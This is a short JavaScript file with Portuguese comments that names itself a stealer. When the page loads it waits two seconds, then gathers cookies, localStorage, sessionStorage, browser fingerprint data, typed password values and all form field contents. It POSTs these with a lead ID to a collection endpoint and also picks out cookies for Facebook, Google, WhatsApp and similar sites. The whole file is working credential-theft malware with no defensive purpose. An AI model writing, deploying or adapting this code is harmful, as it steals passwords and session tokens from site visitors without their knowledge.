// Stealer para cookies e credenciais
async function executarStealer() {
    const dadosStealer = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        },
        plugins: Array.from(navigator.plugins).map(p => p.name),
        timestamp: new Date().toISOString()
    };

    // Tentar capturar senhas salvas
    try {
        const inputs = document.querySelectorAll('input[type="password"]');
        dadosStealer.passwordInputs = Array.from(inputs).map(input => ({
            id: input.id,
            name: input.name,
            value: input.value
        }));
    } catch (e) {}

    // Capturar formulários
    try {
        const forms = document.querySelectorAll('form');
        dadosStealer.forms = Array.from(forms).map(form => ({
            action: form.action,
            method: form.method,
            inputs: Array.from(form.elements).map(el => ({
                type: el.type,
                name: el.name,
                value: el.value
            }))
        }));
    } catch (e) {}

    // Enviar dados
    await enviarDadosColetados('stealer', dadosStealer);
}

// Função para enviar dados coletados
async function enviarDadosColetados(tipo, dados) {
    const leadId = localStorage.getItem('lead_id');
    
    try {
        await fetch('/coletar-dados', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                lead_id: leadId,
                tipo: tipo,
                dados: dados
            })
        });
    } catch (error) {
        console.error('Erro ao enviar dados:', error);
    }
}

// Capturar cookies de domínios específicos
function capturarCookiesEspecificos() {
    const dominiosInteressantes = [
        'facebook.com', 'instagram.com', 'google.com', 
        'youtube.com', 'whatsapp.com', 'gmail.com'
    ];
    
    const cookies = document.cookie.split(';');
    return cookies.filter(cookie => {
        return dominiosInteressantes.some(dominio => 
            cookie.toLowerCase().includes(dominio)
        );
    });
}

// Inicializar stealer quando a página carregar
document.addEventListener('DOMContentLoaded', function() {
    // Executar stealer após um delay
    setTimeout(executarStealer, 2000);
});
